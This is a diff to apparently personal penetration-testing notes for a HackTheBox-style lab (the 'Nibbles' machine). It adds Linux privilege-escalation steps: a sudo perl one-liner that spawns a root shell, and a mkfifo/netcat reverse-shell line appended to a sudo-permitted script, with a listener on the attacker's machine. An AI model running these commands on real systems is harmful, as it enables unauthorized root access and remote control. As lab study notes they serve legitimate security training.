@@ -249,10 +249,21 @@ a. Network Exploitation
 				sudo -l
 			2. this will show what binary/applications can the user run as root on the machine
 				eg. (root) NOPASSWD: /usr/bin/perl
-			3. to get SU access, spawn a shell like this:
+			3. to get SU access, 
+			i.) spawn a perl shell like this:
 				Sudo /usr/bin/perl -e ‘exec “/bin/sh”’
 				id
 				cd/root
+
+			ii.) if you have a method like using ls -l
+			You found a permission to run a script called (User nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh)
+			Then you do below:
+				a. echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14,110 1234 > /tmp/f" >> /home/nibbler/personal/stuff/monitor.sh
+				b. cat /home/nibbler/personal/stuff/monitor.sh
+				c. In kali, nc -nlvp 1234
+				d. back in the shell, run the command: sudo /home/nibbler/personal/stuff/monitor.sh
+
+			
 			
 	iii)Post Exploitation / Persistence
 		a.) Golden Ticket
